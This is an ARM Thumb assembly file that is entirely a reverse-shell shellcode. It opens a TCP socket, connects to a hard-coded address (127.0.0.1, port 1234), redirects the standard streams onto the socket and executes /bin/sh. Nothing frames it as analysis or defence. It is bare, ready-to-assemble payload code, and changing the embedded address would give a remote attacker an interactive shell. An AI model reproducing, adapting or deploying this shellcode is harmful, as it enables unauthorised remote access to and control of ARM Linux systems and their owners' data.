

.global _start
.text

_start:
	.code 16
  # socket()
  eor  r2, r2, r2  # IPPROTO_IP
  mov  r1, #1      # SOCK_STREAM
  mov  r0, #2      # AF_INET
  mov  r7, #281    # socket
  svc  1
  
  # connect()
  mov  r6, r0      # save socket descriptor
  add  r1, pc, #32 # load &sa
  mov  r2, #16     # sizeof(sa)
  add  r7, #2      # socket+2 = connect
  svc  1
  
  # dup()
  mov   r1, #2
dup_loop:
  mov   r7, #63    # dup system call
  mov   r0, r6     # 
  svc   1
  sub   r1, #1
  bpl   dup_loop

  # execve
	eor  r2, r2, r2  
	add  r0, pc, #20 # 
  push {r0, r2}
  mov  r1, sp
	mov  r7, #11
	svc  1
	nop
.word  0xd2040002
.word  0x0100007f  
.ascii "/bin/sh"





